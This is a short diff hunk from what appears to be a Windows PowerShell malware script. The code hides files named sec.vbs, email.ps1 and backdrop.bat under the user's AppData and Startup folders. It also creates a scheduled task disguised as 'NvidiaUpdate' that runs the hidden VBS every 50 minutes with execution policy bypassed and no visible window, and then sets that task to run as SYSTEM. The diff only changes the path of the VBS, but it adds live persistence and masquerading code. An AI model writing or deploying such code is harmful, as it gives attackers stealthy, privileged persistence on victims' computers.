@@ -30,7 +30,7 @@ attrib +h "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs"
 attrib +h "$env:appdata\Microsoft\email.ps1"
 attrib +h "$env:appdata\Microsoft\backdrop.bat"
 
-schtasks /create /sc minute /mo 50 /tn "NvidiaUpdate" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $env:appdata\Microsoft\sec.vbs'" /f
+schtasks /create /sc minute /mo 50 /tn "NvidiaUpdate" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\sec.vbs'" /f
 
 Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"
 
